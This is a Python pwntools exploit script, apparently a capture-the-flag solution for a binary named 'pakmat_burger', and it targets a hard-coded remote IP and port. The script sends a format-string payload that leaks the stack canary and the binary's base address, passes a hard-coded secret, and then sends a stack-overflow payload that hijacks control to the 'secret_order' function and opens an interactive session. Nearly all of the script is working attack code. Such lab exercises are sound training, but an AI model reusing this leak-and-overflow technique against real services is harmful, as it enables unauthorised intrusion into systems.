#!/usr/bin/env python3

from pwn import *

exe = ELF("./pakmat_burger_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "warning"


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("13.229.150.169", 34058)

    return r


def main():
    # for i in range(1, 31):
    #     try:
    #         r = conn()
    #         payload = f"%{i}$s".encode()
    #         r.sendlineafter(b"name: ", payload)
    #         r.recvuntil(b"Hi ")
    #         print(r.recvuntil(b"," , drop=True), i)
    #         r.close()
    #     except:
    #         r.close()
    r = conn()

    # good luck pwning :)

    payload = b"%13$p.%17$p"
    secret = b"996dcd6f"
    r.sendlineafter(b"name: ", payload)
    r.recvuntil(b"Hi ")
    aa = r.recvuntil(b",", drop=True).split(b".")
    canary = eval(aa[0])
    leak = eval(aa[1])
    exe.address = leak - 4980

    print(hex(canary), hex(exe.address))

    # gdb.attach(r)
    r.sendlineafter(b"secret message: ", secret)
    r.sendlineafter(b"order?", b'a')

    payload = b"a"*37
    payload += p64(canary)*2
    payload += p64(exe.address + 0x000000000000101a)
    payload += p64(exe.sym.secret_order)

    r.sendlineafter(b"soon: ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
